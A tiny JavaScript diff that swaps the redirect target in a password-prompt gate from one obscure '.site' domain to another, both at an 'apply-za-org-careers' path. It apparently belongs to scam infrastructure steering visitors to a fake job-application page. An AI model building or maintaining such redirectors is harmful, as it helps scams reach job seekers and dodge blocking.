@@ -4,5 +4,5 @@ password = prompt(
   'APPLY'
 );
 if (password != 'APPLY') {
-  location.href = 'https://www.ufodofitid.site/apply-za-org-careers';
+  location.href = 'https://www.ndoofitid.site/apply-za-org-careers';
 }
